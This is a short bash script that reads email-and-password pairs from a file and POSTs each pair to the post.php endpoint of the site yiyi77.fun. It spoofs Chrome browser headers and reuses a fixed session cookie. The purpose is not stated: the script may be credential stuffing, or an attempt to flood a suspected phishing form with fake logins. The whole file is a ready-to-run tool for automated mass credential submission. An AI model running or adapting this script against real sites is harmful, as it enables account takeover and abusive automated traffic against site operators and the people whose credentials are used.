#!/bin/bash

while IFS= read -r line; do
  curl 'https://yiyi77.fun/post.php' \
  -H 'authority: yiyi77.fun' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: PHPSESSID=84a56d7utrgnmuii93uo4uvn67; user_recoding=isalien' \
  -H 'origin: https://yiyi77.fun' \
  -H 'referer: https://yiyi77.fun/' \
  -H 'sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw "mail=$(echo $line | cut -d ',' -f 1)&pass=$(echo $line | cut -d ',' -f 2)" \
  --compressed
done < "emails_passwords.txt"
